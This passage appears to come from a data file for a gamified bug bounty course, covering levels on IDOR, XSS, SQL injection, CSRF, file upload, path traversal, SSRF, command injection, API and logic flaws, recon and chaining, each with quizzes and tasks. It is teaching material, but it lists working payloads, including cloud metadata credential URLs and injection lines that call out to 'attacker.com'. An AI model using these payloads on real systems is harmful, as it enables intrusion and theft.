            {"q": "Which JWT attack uses alg:'none'?", "opts": ["Algorithm confusion", "Signature bypass", "JWK injection", "KID traversal"], "ans": 1},
            {"q": "When should SameSite=Strict be used?", "opts": ["For tracking cookies", "For session cookies on sensitive apps", "For all cookies", "Never"], "ans": 1},
        ], "xp_reward": 250
    },
    15: {
        "title": "Broken Access Control (IDOR)",
        "subtitle": "Level 15: Accessing What You Shouldn't",
        "description": "IDOR is the most common vulnerability in bug bounty. Learn to find and exploit it systematically.",
        "topics": [
            {"name": "What is IDOR?", "content": "IDOR (Insecure Direct Object Reference) occurs when an application exposes a direct reference to an internal object (user ID, file, invoice) without checking if the user should have access. Example: /api/invoice/123 → change to 124 → see another user's invoice. Simple, common, often critical.", "emoji": "🔓"},
            {"name": "IDOR Testing Methodology", "content": "1) Create two accounts (A and B), 2) Authenticate as A, capture request for A's resource, 3) Modify the object identifier to B's ID, 4) If you see B's data → IDOR. Test: GET, POST, PUT, DELETE; URL params, POST body, headers. Use Burp's Autorize extension.", "emoji": "🧪"},
            {"name": "UUID & Hash-based IDOR", "content": "Even with UUIDs instead of sequential IDs, if the endpoint doesn't verify ownership, it's still IDOR. You can obtain valid UUIDs through: error messages, WebSocket data, referral codes, batch operations, shared resources. Non-guessable ≠ secure.", "emoji": "🔢"},
            {"name": "Blind IDOR & Mass Assignment", "content": "Blind IDOR: response doesn't show data but you infer access via status codes, timing, or response length. Mass Assignment: extra fields in request body (role:admin, is_admin:true) modify security properties. GraphQL APIs are particularly vulnerable to mass assignment.", "emoji": "👁️"},
        ],
        "task": {"title": "Two-Account IDOR Test", "description": "Create two accounts on a target. As account A, find an endpoint that references an object (user profile, order, message). Try to access account B's object by modifying the ID. Document your test and results.", "expected_answer": "Methodical IDOR test with findings (or confirmation of protection).", "xp_reward": 300},
        "interview_prompt": "What is IDOR and how do you test for it? Explain UUID-based IDOR and mass assignment.",
        "key_concepts": ["idor", "broken access control", "authorization", "direct object reference", "mass assignment", "uuid", "bola"],
        "quiz": [
            {"q": "What does IDOR stand for?", "opts": ["Internal Data Object Restriction", "Insecure Direct Object Reference", "Integrated Domain Object Router", "Indirect Data Origin Request"], "ans": 1},
            {"q": "How do you confirm an IDOR?", "opts": ["Modify object ID and access another user's data", "Inject SQL into parameter", "XSS on the same page", "Check SSL certificate"], "ans": 0},
            {"q": "What is mass assignment?", "opts": ["Testing multiple endpoints at once", "Sending extra fields in request to modify security properties", "A type of DDoS attack", "Password brute forcing"], "ans": 1},
        ], "xp_reward": 300
    },
    16: {
        "title": "Privilege Escalation",
        "subtitle": "Level 16: From User to Admin",
        "description": "Privilege escalation turns a low-impact bug into a critical one. Learn to chain access control flaws.",
        "topics": [
            {"name": "Vertical vs Horizontal Privilege Escalation", "content": "Horizontal: access same-role user's data (user A accesses user B's data) — typically IDOR. Vertical: access higher-privilege functionality (user becomes admin) — more severe. Both are access control failures. Vertical escalation often requires chaining multiple issues.", "emoji": "📈"},
            {"name": "Admin Panel Discovery & Exploitation", "content": "Find admin panels via: subdomain brute-force (admin.example.com), directory brute-force (/admin, /administrator), guessing common paths, Google dorks (intitle:admin intitle:login). Once found, test for: default credentials, no auth on actions, IDOR in admin functions, privilege escalation from user account.", "emoji": "👑"},
            {"name": "Role Manipulation & Hidden Fields", "content": "Check if role is sent from client: hidden form fields (role=user), request body ({\"role\":\"admin\"}), cookies, headers (X-Role: admin), JWT payload. If the server trusts client-provided role, you can escalate. Always test modifying role-related parameters.", "emoji": "🎭"},
            {"name": "Chaining for Impact", "content": "A single low-severity bug is often ignored. But chained: XSS to steal admin cookie + admin has access to user data export = critical. SSRF to reach internal admin panel + default creds = RCE. Think in chains: 'If I can do X, what else can I reach?'", "emoji": "⛓️"},
        ],
        "task": {"title": "Find a Privilege Escalation Vector", "description": "On a target, identify features where role/privilege is checked. Test: 1) Can a regular user access /admin routes? 2) Are admin functions hidden but accessible? 3) Can you modify role in request? 4) Can you escalate via IDOR?", "expected_answer": "Privilege escalation test results with methodology.", "xp_reward": 300},
        "interview_prompt": "What is the difference between vertical and horizontal privilege escalation? How do you find and exploit admin panels?",
        "key_concepts": ["privilege escalation", "vertical", "horizontal", "admin panel", "role manipulation", "chaining"],
        "quiz": [
            {"q": "What is vertical privilege escalation?", "opts": ["Accessing same-role user data", "Gaining higher-level access", "Adding more users", "Increasing server resources"], "ans": 1},
            {"q": "What should you check in a JWT for privilege escalation?", "opts": ["Expiry date", "Role/payload claims", "Algorithm type", "Header format"], "ans": 1},
            {"q": "Why chain vulnerabilities?", "opts": ["To get higher rewards", "Low-severity bugs can combine into critical impact", "It's easier than finding a single bug", "Platforms require chaining"], "ans": 1},
        ], "xp_reward": 300
    },
    17: {
        "title": "Cross-Site Scripting (XSS)",
        "subtitle": "Level 17: Client-Side Attacks",
        "description": "XSS is everywhere. Master all three types and learn to find them in modern applications.",
        "topics": [
            {"name": "XSS Fundamentals", "content": "XSS injects malicious scripts into web pages viewed by others. Three types: Reflected (payload in request, immediate response), Stored (payload saved on server, served to all visitors), DOM-based (client-side JS processes unsafe input). Reflected is easiest to find; Stored is most severe.", "emoji": "📜"},
            {"name": "Reflected XSS — Testing & Exploitation", "content": "Test every input: URL parameters, POST body, headers (User-Agent, Referer), file names. Payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>, ';!--\"<XSS>=&{()}. Context matters: HTML context, attribute context, JS context, URL context. Use different payloads per context.", "emoji": "🎯"},
            {"name": "Stored XSS — The Critical Variant", "content": "Payload is saved on server and executes for every visitor. Common stores: comments, profiles, reviews, support tickets, chat messages, forum posts. Testing: inject payload → check if it's stored → verify execution on page reload. Stored XSS in admin panels is critical — it can compromise all users.", "emoji": "💾"},
            {"name": "DOM-based XSS & Modern Frameworks", "content": "Vulnerability is in client-side JS, not server response. Sources: location.hash, document.URL, document.referrer, postMessage, localStorage. Sinks: innerHTML, document.write, eval, setTimeout, jQuery.html(). DOM XSS is invisible to server-side scanners. Use DOM Invader (Burp) for detection.", "emoji": "🕸️"},
        ],
        "task": {"title": "XSS Context Detection", "description": "Inject a harmless probe (foo\"bar<b>test) into a parameter. View the HTML source. Determine: 1) Is it reflected? 2) What HTML context (between tags, inside attribute, inside script)? 3) What payload would work? Write the exploit.", "expected_answer": "Context analysis and working XSS payload for the detected context.", "xp_reward": 300},
        "interview_prompt": "Explain the three types of XSS. How do you test for each and what makes stored XSS more severe?",
        "key_concepts": ["xss", "cross-site scripting", "reflected xss", "stored xss", "dom xss", "payload", "context", "csp bypass"],
        "quiz": [
            {"q": "Which XSS type is most severe?", "opts": ["Reflected", "Stored", "DOM-based", "Blind"], "ans": 1},
            {"q": "What HTML context is this: <input value='[INJECT]'>", "opts": ["Between tags", "Attribute value", "Inside script", "Inside comment"], "ans": 1},
            {"q": "Which tool helps detect DOM XSS?", "opts": ["sqlmap", "DOM Invader", "nmap", "Nikto"], "ans": 1},
        ], "xp_reward": 300
    },
    18: {
        "title": "SQL Injection",
        "subtitle": "Level 18: Database Attacks",
        "description": "SQLi is older but still deadly. From auth bypass to full database takeover.",
        "topics": [
            {"name": "SQL Injection Basics", "content": "SQLi occurs when user input is concatenated into SQL queries. Classic example: SELECT * FROM users WHERE username='admin' AND password='guess'. Input: admin' -- (comments out password check). Impact: auth bypass, data extraction, data modification, RCE on some databases.", "emoji": "💉"},
            {"name": "Union-based & Error-based SQLi", "content": "UNION SELECT adds your query to the original. Requirements: same number of columns, compatible data types. Error-based: database errors in responses reveal information. MySQL: extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))). Error-based is fast but noisy.", "emoji": "🔗"},
            {"name": "Blind SQL Injection", "content": "No error messages or data in responses. Boolean-based: ask true/false questions via conditions (1=1 vs 1=2). Time-based: use SLEEP(5) to infer truth from response delay. Blind SQLi is slow but reliable. Tools: sqlmap automates all techniques.", "emoji": "🦯"},
            {"name": "SQLi Automation with sqlmap", "content": "sqlmap is the standard SQLi tool. Basic: sqlmap -u 'http://target.com/page?id=1' --batch. Flags: --level (1-5, deeper testing), --risk (1-3, riskier payloads), --dbms (filter techniques), --os-shell (RCE). Always start with --batch --level 3 --risk 2.", "emoji": "🤖"},
        ],
        "task": {"title": "SQLi Detection Exercise", "content": "Given endpoint: https://testapp.com/products?id=5\nTest the id parameter with:\n1) ' (apostrophe) → error?\n2) ' OR '1'='1 → different results?\n3) ' AND 1=1 -- → same as normal?\n4) ' AND 1=2 -- → different?\n\nDocument observations and what they indicate.", "expected_answer": "SQLi detection analysis with boolean-based confirmation.", "xp_reward": 300},
        "interview_prompt": "How does SQL injection work? Explain union-based vs blind SQLi and when to use sqlmap.",
        "key_concepts": ["sqli", "sql injection", "union", "blind sqli", "error-based", "sqlmap", "database", "boolean", "time-based"],
        "quiz": [
            {"q": "What SQL keyword comments out the rest of a query?", "opts": ["/*", "--", "##", "REM"], "ans": 1},
            {"q": "What does 'OR '1'='1 do in a WHERE clause?", "opts": ["Does nothing", "Makes condition always true", "Causes syntax error", "Slows the query"], "ans": 1},
            {"q": "Which SQLi technique uses SLEEP(5)?", "opts": ["Union-based", "Error-based", "Time-based blind", "Boolean-based blind"], "ans": 2},
        ], "xp_reward": 300
    },
    19: {
        "title": "CSRF Attacks",
        "subtitle": "Level 19: Cross-Site Request Forgery",
        "description": "CSRF tricks authenticated users into performing actions they didn't intend. Learn to exploit and defend.",
        "topics": [
            {"name": "How CSRF Works", "content": "User is logged into bank.com. Attacker sends them to evil.com which auto-submits: <form action='https://bank.com/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'>. Browser sends the session cookie automatically → transfer happens. User never clicked a button.", "emoji": "🎣"},
            {"name": "CSRF Detection & Testing", "content": "Identify state-changing requests (POST, PUT, DELETE). Check if they require: CSRF token (random value tied to session), custom header (X-Requested-By, X-CSRF-Token), SameSite cookie, or referer/origin validation. If none → CSRF vulnerable. Generate a POC HTML form to confirm.", "emoji": "🔍"},
            {"name": "SameSite Bypass Techniques", "content": "SameSite=Lax (default) still sends cookies for top-level GET navigations. If the action accepts GET method → exploitable. Subdomain XSS/takeover can issue cookies with Domain attribute overriding SameSite. OAuth redirect chains can trigger state changes across origins.", "emoji": "🔄"},
            {"name": "CSRF Token Analysis", "content": "Tokens should be: unique per session, tied to user, random (not predictable), different per request, validated server-side. Common flaws: static token, token derived from username/email, token not validated on all endpoints, token reused across sessions, token sent via GET parameter.", "emoji": "🔑"},
        ],
        "task": {"title": "CSRF POC Generation", "description": "Find a state-changing endpoint (e.g., email change, profile update) that lacks CSRF protection. Create a simple HTML page that auto-submits the request. Test it. Document your findings.", "expected_answer": "Working CSRF proof-of-concept with test results.", "xp_reward": 250},
        "interview_prompt": "What is CSRF and how does it work? How do SameSite cookies affect CSRF protection and what are common CSRF token flaws?",
        "key_concepts": ["csrf", "xsrf", "cross-site request forgery", "token", "samesite", "cookie", "state change"],
        "quiz": [
            {"q": "What does CSRF exploit?", "opts": ["Server-side validation", "Browser's automatic cookie sending", "SQL query injection", "DNS resolution"], "ans": 1},
            {"q": "Which header helps prevent CSRF?", "opts": ["Content-Type", "SameSite cookie attribute", "User-Agent", "Accept-Language"], "ans": 1},
            {"q": "What is a CSRF token?", "opts": ["A session identifier", "A random value validating request origin", "An encryption key", "A type of cookie"], "ans": 1},
        ], "xp_reward": 250
    },
    20: {
        "title": "File Upload Vulnerabilities",
        "subtitle": "Level 20: Weaponizing File Uploads",
        "description": "File upload features are notoriously dangerous. From RCE to stored XSS, learn to exploit them all.",
        "topics": [
            {"name": "File Upload Attack Surface", "content": "Upload features exist everywhere: profile pictures, attachments, document uploads, CSV imports. Each one is a potential entry point. Attack vectors: RCE via executable files (PHP, ASP, JSP), stored XSS via HTML/SVG, XML injection via DOCX/XLSX, SSRF via file processing.", "emoji": "📎"},
            {"name": "Bypassing File Type Restrictions", "content": "Servers check: file extension (.jpg), MIME type (image/jpeg), magic bytes (89 50 4E 47 = PNG), content inspection. Bypasses: double extension (shell.php.jpg), null byte (shell.php%00.jpg), MIME mismatch, polyglot files (valid image + PHP code), extension case (.PhP).", "emoji": "🪄"},
            {"name": "SVG XSS & Image-based Attacks", "content": "SVG files support JavaScript. Upload SVG with <script>alert(1)</script> → stored XSS when image is rendered. Some parsers execute JS during processing server-side (XXE in SVG parser). Test: <svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>.", "emoji": "🖼️"},
            {"name": "Zip Slip & Archive Extraction Attacks", "content": "When servers extract uploaded archives (ZIP, tar), path traversal in filenames (../../../etc/passwd) overwrites system files. Test: upload ZIP with symlinks or files named ../../app/config.php. Critical: can overwrite application code.", "emoji": "🗜️"},
        ],
        "task": {"title": "File Upload Bypass Lab", "description": "Find a file upload feature. Attempt to upload: 1) .php file, 2) .php.jpg double extension, 3) SVG with script tag, 4) A file with magic bytes of PNG but PHP extension. Document which bypasses work.", "expected_answer": "File upload bypass attempt results for 4+ techniques.", "xp_reward": 300},
        "interview_prompt": "What attacks are possible through file upload features? How do you bypass file type restrictions?",
        "key_concepts": ["file upload", "rce", "svg xss", "polyglot", "zip slip", "mime type", "magic bytes", "extension bypass"],
        "quiz": [
            {"q": "What file type can execute JavaScript when viewed?", "opts": ["JPEG", "SVG", "PDF", "MP4"], "ans": 1},
            {"q": "What are magic bytes?", "opts": ["Encrypted file headers", "File signature bytes identifying format", "Magic numbers in URLs", "Hash values"], "ans": 1},
            {"q": "What is Zip Slip?", "opts": ["A compression algorithm", "Path traversal via archive extraction", "A ZIP password cracker", "File upload optimization"], "ans": 1},
        ], "xp_reward": 300
    },
    21: {
        "title": "Path Traversal / LFI",
        "subtitle": "Level 21: Reading Files on the Server",
        "description": "Path traversal lets you read arbitrary files. LFI can escalate to code execution.",
        "topics": [
            {"name": "Path Traversal Basics", "content": "Path traversal (directory traversal) exploits insufficient input validation to read files outside the intended directory. Example: /download?file=../../../etc/passwd. ../ goes up one directory. Use enough ../ to reach the root, then specify the target file path.", "emoji": "📂"},
            {"name": "Detection & Bypass Techniques", "content": "Traversal detection: try ../../../etc/passwd on any parameter referencing a file (image, download, include, template, language). Bypasses: URL encoding (%2e%2e%2f), double encoding (%252e%252e%252f), nested traversal (....//....//), absolute path (/etc/passwd), null byte bypass (.pdf bypass).", "emoji": "🪟"},
            {"name": "LFI to RCE", "content": "Local File Inclusion (LFI) can become Remote Code Execution via: 1) PHP wrapper (php://input with POST body code), 2) PHP filter chain (php://filter/convert.base64-encode/resource=config.php), 3) Log poisoning (inject PHP into User-Agent, then include /var/log/apache/access.log), 4) /proc/self/environ.", "emoji": "💥"},
            {"name": "Testing for LFI in Parameters", "content": "Check parameters named: file, page, include, template, theme, lang, load, document, folder, root, path, style, pdf, upload, download. Test with LFI wordlists. Look for error messages revealing include paths. Tools: ffuf with traversal wordlists.", "emoji": "🔬"},
        ],
        "task": {"title": "Path Traversal Probe", "description": "Find a parameter that references a file. Test: ../../../etc/passwd, %2e%2e%2fetc%2fpasswd, ....//....//....//etc/passwd, /etc/passwd (absolute path). Document which payloads work and which files you can read.", "expected_answer": "Path traversal test results for 4+ payload variations.", "xp_reward": 250},
        "interview_prompt": "What is path traversal and how is it exploited? How can LFI lead to remote code execution?",
        "key_concepts": ["path traversal", "directory traversal", "lfi", "rce", "log poisoning", "php wrapper", "../"],
        "quiz": [
            {"q": "What does ../ do in a file path?", "opts": ["Go to root", "Go up one directory", "Go down one directory", "List directory contents"], "ans": 1},
            {"q": "Which technique turns LFI into RCE?", "opts": ["SQL injection", "Log poisoning", "XSS", "CSRF"], "ans": 1},
            {"q": "What encoding is %2e%2e%2f?", "opts": ["Base64", "URL encoding of ../", "Hex encoding", "Unicode"], "ans": 1},
        ], "xp_reward": 250
    },
    22: {
        "title": "Server-Side Request Forgery (SSRF)",
        "subtitle": "Level 22: Making the Server Your Proxy",
        "description": "SSRF forces the server to make requests to internal systems. Cloud metadata SSRF is the most critical variant.",
        "topics": [
            {"name": "SSRF Fundamentals", "content": "SSRF occurs when a server fetches a URL provided by the user. Example: /fetch?url=http://example.com. Instead, attacker sends /fetch?url=http://169.254.169.254/ (AWS metadata) → retrieves cloud IAM credentials. SSRF can: read internal files (file://), scan internal networks, access cloud metadata.", "emoji": "🔄"},
            {"name": "Cloud Metadata Exploitation", "content": "AWS: http://169.254.169.254/latest/meta-data/ , GCP: http://metadata.google.internal, Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01. AWS IMDSv1 returns credentials without auth. IMDSv2 requires a session token but has known bypasses. This is how Capital One was breached.", "emoji": "☁️"},
            {"name": "Blind SSRF Detection", "content": "When no response data is returned, use out-of-band (OOB) detection: set up a listener (Burp Collaborator, Interactsh, webhook.site), send target URL pointing to your listener, check for callbacks. DNS callbacks work even when HTTP is blocked. Any callback confirms SSRF.", "emoji": "📡"},
            {"name": "SSRF Bypass & Protocol Smuggling", "content": "Bypass allowlists: DNS rebinding (domain alternates IPs), IPv6 (::1 = localhost), URL parsing tricks (http://127.0.0.1#@evil.com = different parsers interpret differently), redirect following (server follows 302 to internal IP). Protocol switch: file://, gopher://, dict://, ftp://.", "emoji": "🪄"},
        ],
        "task": {"title": "SSRF Probe", "description": "Find an endpoint that fetches a URL (image proxy, webhook, PDF generator). Test: 1) http://127.0.0.1:80 (loopback), 2) http://169.254.169.254 (AWS metadata), 3) file:///etc/passwd, 4) Your controlled webhook. Document what works.", "expected_answer": "SSRF test results with methodology.", "xp_reward": 350},
        "interview_prompt": "What is SSRF and why is cloud metadata exploitation so critical? How do you detect blind SSRF?",
        "key_concepts": ["ssrf", "cloud metadata", "aws", "gcp", "azure", "blind ssrf", "dns rebinding", "oob testing"],
        "quiz": [
            {"q": "What is the AWS metadata IP address?", "opts": ["10.0.0.1", "169.254.169.254", "192.168.1.1", "8.8.8.8"], "ans": 1},
            {"q": "How do you detect blind SSRF?", "opts": ["Read response body", "Use out-of-band callbacks", "Check server logs", "Monitor network traffic"], "ans": 1},
            {"q": "What protocol switch can read local files via SSRF?", "opts": ["http://", "file://", "dns://", "smtp://"], "ans": 1},
        ], "xp_reward": 350
    },
    23: {
        "title": "Command Injection Basics",
        "subtitle": "Level 23: Running Commands on the Server",
        "description": "Command injection lets you execute OS commands. Critical severity — full server takeover.",
        "topics": [
            {"name": "Command Injection Fundamentals", "content": "Occurs when user input is passed to system commands without sanitization. Example: ping -c 4 [user_input]. Input: 127.0.0.1; cat /etc/passwd → executes both ping and cat. Command separators: ; (semicolon), && (AND), || (OR), | (pipe), ` (backtick), $() (subshell).", "emoji": "💻"},
            {"name": "Detection & Exploitation", "content": "Test parameters that interact with the OS: ping, nslookup, traceroute, host, curl, wget, dig, whois, convert (ImageMagick), ffmpeg. Inject: ;id, && whoami, | hostname. Blind detection: ; sleep 5 (time-based). Out-of-band: ; nslookup attacker.com (DNS callback).", "emoji": "🔍"},
            {"name": "Payload Crafting & Obfuscation", "content": "Bypass filters: newlines (%0a), backticks (`cmd`), $(), wildcards (/???/c%74%61%74 /etc/passwd), base64 encoded commands (echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh). Chaining: combine with other techniques for maximum impact.", "emoji": "📝"},
            {"name": "Blind Command Injection", "content": "When output isn't returned: time-based (?cmd=||sleep 5||), out-of-band (?cmd=||curl attacker.com/$(whoami)||). Always have a listener ready (webhook.site, Interactsh). Blind command injection is still critical — even without output, the attacker has code execution.", "emoji": "🦯"},
        ],
        "task": {"title": "Command Injection Test", "description": "Find a parameter that might reach the OS (ping, nslookup, convert). Test: 1) ;id, 2) && whoami, 3) | hostname, 4) `sleep 5` (time-based blind). Document which payloads execute.", "expected_answer": "Command injection test results with payloads and observations.", "xp_reward": 300},
        "interview_prompt": "What is command injection and where does it occur? How do you detect blind command injection?",
        "key_concepts": ["command injection", "rce", "os command", "blind", ";", "|", "subshell", "ping", "sleep"],
        "quiz": [
            {"q": "What command separator runs both commands?", "opts": ["&&", ";", "||", "&"], "ans": 1},
            {"q": "How do you detect blind command injection?", "opts": ["Check response body", "Use time delay (sleep)", "Read error messages", "Scan ports"], "ans": 1},
            {"q": "What base64 string decodes to 'id'?", "opts": ["aWQ=", "aWQK", "aWQ=\n", "ZWNobyBpZA=="], "ans": 0},
        ], "xp_reward": 300
    },
    24: {
        "title": "API Security Testing",
        "subtitle": "Level 24: Breaking Modern APIs",
        "description": "Most modern apps are API-driven. Learn API-specific vulnerabilities including GraphQL, REST, and microservices.",
        "topics": [
            {"name": "OWASP API Security Top 10", "content": "API1: Broken Object Level Auth (IDOR), API2: Broken Authentication, API3: Broken Object Property Level Auth (mass assignment), API4: Unrestricted Resource Consumption, API5: Broken Function Level Auth, API6: Unrestricted Access to Sensitive Business Flows, API7: SSRF, API8: Security Misconfiguration, API9: Improper Inventory Mgmt, API10: Unsafe Consumption of APIs.", "emoji": "📋"},
            {"name": "REST API Testing Methodology", "content": "1) Discover endpoints (docs, JS, crawl), 2) Test each method (GET, POST, PUT, PATCH, DELETE), 3) Test auth/role requirements, 4) Test parameter tampering, 5) Test rate limiting, 6) Test mass assignment, 7) Test pagination abuse, 8) Test content type parsing. APIs often expose more than web pages.", "emoji": "🔀"},
            {"name": "GraphQL Security", "content": "GraphQL introspection reveals entire schema: query {__schema{types{name fields{name}}}}. Batch queries bypass rate limits. Deeply nested queries cause DoS. Field-level authorization may be missing. Alias-based IDOR: query multiple object IDs in one request. Tools: inql, GraphQL Voyager, Altair.", "emoji": "📊"},
            {"name": "API Key & Token Handling", "content": "API keys in URLs (logged by intermediaries), keys in client-side code (mobile apps, JS), keys with excessive permissions, no key rotation, keys hardcoded in public repos. Rate limiting bypass via API key rotation. Check if API keys truly authenticate or just identify.", "emoji": "🔑"},
        ],
        "task": {"title": "API Discovery & Testing", "description": "Find an API endpoint (use browser DevTools Network tab). Document: 1) Full URL with parameters, 2) HTTP method, 3) Authentication method, 4) Response format, 5) Test: modify parameter, change method, remove auth header, try common GraphQL paths (/graphql, /api/graphql).", "expected_answer": "Complete API endpoint analysis with vulnerability tests.", "xp_reward": 300},
        "interview_prompt": "What are the OWASP API Security Top 10? How do you test REST APIs and GraphQL endpoints for vulnerabilities?",
        "key_concepts": ["api", "graphql", "rest", "api security", "owasp api top 10", "introspection", "mass assignment", "rate limiting"],
        "quiz": [
            {"q": "What GraphQL feature often reveals the full schema?", "opts": ["Batching", "Introspection", "Aliases", "Mutations"], "ans": 1},
            {"q": "Which API vulnerability is about authorization at object level?", "opts": ["API2: Broken Auth", "API1: Broken Object Level Auth", "API3: Broken Property Level Auth", "API5: Broken Function Level Auth"], "ans": 1},
            {"q": "Where should API keys NOT be placed?", "opts": ["HTTP headers", "URL query string", "Request body", "Environment variables"], "ans": 1},
        ], "xp_reward": 300
    },
    25: {
        "title": "Business Logic Vulnerabilities",
        "subtitle": "Level 25: Attacking Application Design",
        "description": "Business logic bugs are unique to each app. They can't be auto-detected — only found through creative thinking.",
        "topics": [
            {"name": "What Are Business Logic Bugs?", "content": "Flaws in how the application's business rules are implemented. Not a technical vulnerability (like SQLi), but a design flaw. Examples: buying items for negative price, bypassing payment steps, reusing coupon codes infinitely, manipulating currency conversion rounding. These earn the highest bounties.", "emoji": "🧠"},
            {"name": "Race Conditions (TOCTOU)", "content": "Time-of-Check Time-of-Use: check happens, then use happens, but between them the state changes. Coupon abuse: send 50 concurrent requests applying the same coupon → all succeed before server marks it used. Balance transfer: race two transfers from same account. Tools: Burp Turbo Intruder.", "emoji": "🏁"},
            {"name": "Workflow Bypass & Parameter Tampering", "content": "Multi-step processes (checkout, registration, onboarding) trust that users follow the intended flow. Skip steps, reorder them, go back to previous steps, access steps directly. Hidden fields, disabled fields, and dropdown options can be modified client-side and submitted.", "emoji": "🔄"},
            {"name": "Pricing & Financial Logic Flaws", "content": "Negative quantities, unlimited coupons, currency conversion rounding ($0.004 → $0.00, accumulate over millions of transactions), integer overflow (buying negative quantity = store pays you), subscription manipulation (free trial never ends, downgrading doesn't remove access).", "emoji": "💰"},
        ],
        "task": {"title": "Business Logic Brainstorm", "description": "Pick an e-commerce or financial app. Write 10 business logic test ideas covering: 1) Coupon/reward abuse, 2) Pricing manipulation, 3) Workflow bypass, 4) Race conditions, 5) Quantity/limit edge cases. Test at least 3 ideas.", "expected_answer": "10 business logic test ideas with results from 3 tests.", "xp_reward": 350},
        "interview_prompt": "What are business logic vulnerabilities? How do race conditions and workflow bypasses work?",
        "key_concepts": ["business logic", "race condition", "toctou", "workflow bypass", "pricing flaw", "coupon abuse", "turbo intruder"],
        "quiz": [
            {"q": "What is a race condition?", "opts": ["Two requests at different speeds", "Concurrent operations causing unexpected state", "A type of SQL injection", "DNS resolution timing"], "ans": 1},
            {"q": "Why can't scanners find logic bugs?", "opts": ["Scanners are too slow", "They're unique to each application's business rules", "They're only in mobile apps", "They require admin access"], "ans": 1},
            {"q": "What tool sends concurrent requests for race condition testing?", "opts": ["sqlmap", "Turbo Intruder", "nmap", "ffuf"], "ans": 1},
        ], "xp_reward": 350
    },
    26: {
        "title": "Advanced Recon Techniques",
        "subtitle": "Level 26: Going Beyond Basic Recon",
        "description": "Basic recon finds the obvious. Advanced recon finds what everyone else misses.",
        "topics": [
            {"name": "GitHub & Code Search Dorking", "content": 'Search target.com in GitHub code: org:target, "target" password, "target" api_key, "target" secret. Also: GitLab, Bitbucket, SourceForge. Look for: hardcoded credentials, API keys, internal URLs, configuration files, .env files, database connection strings, internal documentation.', "emoji": "🔍"},
            {"name": "Acquisition & Infrastructure Discovery", "content": "Companies acquire other companies → acquire their attack surface. Check: SEC filings (acquisitions), LinkedIn (jobs mentioning technologies), job postings (infrastructure details), press releases (new products, partnerships), investor decks. Every acquisition brings new subdomains, technologies, and bugs.", "emoji": "🏢"},
            {"name": "CDN & Reverse Proxy Enumeration", "content": "Behind Cloudflare? Find real IP: historical DNS records (SecurityTrails, Censys), misconfigured MX records, Cloudflare IP bypass via Cloudwatch/AWS, Shodan search by domain, SSL certificate IPs, scanning non-CDN protected subdomains (direct-connect.target.com).", "emoji": "🛡️"},
            {"name": "Automated Recon Frameworks", "content": "Full pipelines: Project Discovery's chaos pipeline (subfinder → httpx → nuclei), reconftw, lazyrecon, sn0int. Docker-based frameworks for reproducible runs. Store results in databases (Postgres, MongoDB) for historical analysis — compare scans over time to find new assets.", "emoji": "⚙️"},
        ],
        "task": {"title": "Advanced Recon on a Target", "description": "Pick a target. Perform: 1) GitHub search for company name + 'password'/'secret'/'api_key', 2) Shodan search for domain, 3) Check SecurityTrails for historical DNS, 4) Identify CDN and try to find real IP. Document findings.", "expected_answer": "Advanced recon results across 4+ sources.", "xp_reward": 300},
        "interview_prompt": "How do you search for leaked secrets on GitHub? How do you find the real IP behind CDNs like Cloudflare?",
        "key_concepts": ["github dorking", "secret scanning", "acquisition recon", "cdn bypass", "shodan", "censys", "recon framework"],
        "quiz": [
            {"q": "Where should you search for leaked company secrets?", "opts": ["Only GitHub", "GitHub, GitLab, Bitbucket, and code search engines", "Only public repos", "Dark web"], "ans": 1},
            {"q": "What is a common CDN bypass technique?", "opts": ["DNS amplification", "Finding real IP via historical DNS records", "SSL stripping", "HTTP smuggling"], "ans": 1},
            {"q": "Why track acquisitions in bug bounty?", "opts": ["Acquired companies are easier targets", "They add new attack surface", "They have better rewards", "They are legally safer"], "ans": 1},
        ], "xp_reward": 300
    },
    27: {
        "title": "Vulnerability Chaining",
        "subtitle": "Level 27: Combining Bugs for Maximum Impact",
        "description": "Individual low-severity bugs are often dismissed. Chained together, they become critical. Learn to think in chains.",
        "topics": [
            {"name": "Why Chain Vulnerabilities?", "content": "A reflected XSS alone: 'Use this to phish.' An IDOR alone: 'View other users' data.' But: XSS to steal admin session → use admin session to access IDOR for exporting all users' data = Critical data breach. Chaining multiplies impact. Top hunters think in chains, not isolated bugs.", "emoji": "⛓️"},
            {"name": "Classic Attack Chains", "content": "1) Open redirect → steal OAuth token → account takeover. 2) XSS → CSRF bypass → change victim's email → password reset → full account takeover. 3) SSRF → reach internal metadata endpoint → cloud credentials → cloud account takeover. 4) LFI → log poisoning → RCE. 5) Subdomain takeover → host malicious JS → steal cookies of main domain users.", "emoji": "🔗"},
            {"name": "Finding Chainable Weaknesses", "content": "Map every finding: what access does it give? What can you reach with that access? Create a graph: XSS → cookie theft → session hijacking → admin actions → data exfiltration. Document prerequisites and dependencies. A chain is only as strong as its weakest link — patch that if you're defending.", "emoji": "🗺️"},
            {"name": "Chain-Based Reporting", "content": "Report chains as a single issue with the final impact, don't submit each link separately. Example: 'Chained XSS + CSRF + IDOR leading to full account takeover of any user' gets a critical severity and higher bounty. Show the complete chain: step 1 exploits → step 2 → final impact. Proof of concept video is highly effective.", "emoji": "📝"},
        ],
        "task": {"title": "Build an Attack Chain", "description": "Pick 2 vulnerabilities you've learned (e.g., XSS + CSRF, SSRF + cloud metadata, LFI + log poisoning). Describe a realistic chain: 1) Prerequisites, 2) Step-by-step exploitation, 3) Final impact, 4) How you would report it.", "expected_answer": "A complete attack chain with methodology and reporting strategy.", "xp_reward": 350},
        "interview_prompt": "Why is vulnerability chaining important? Give an example of a chain that turns low-severity issues into critical impact.",
        "key_concepts": ["chaining", "attack chain", "impact escalation", "bug chain", "prerequisites", "chain reporting"],
        "quiz": [
            {"q": "Why do top hunters chain vulnerabilities?", "opts": ["It's faster than finding single bugs", "Chaining multiplies impact and bounty", "Platforms require chaining", "Single bugs are never accepted"], "ans": 1},
            {"q": "Which chain gives cloud account takeover?", "opts": ["XSS → CSRF", "SSRF → cloud metadata", "LFI → RCE", "IDOR → privilege escalation"], "ans": 1},
            {"q": "How should you report a chain?", "opts": ["As separate issues for more bounty", "As a single issue showing the complete chain impact", "Only the last step", "Only the first step"], "ans": 1},
        ], "xp_reward": 350
    },
    28: {
        "title": "Real Bug Bounty Case Studies",
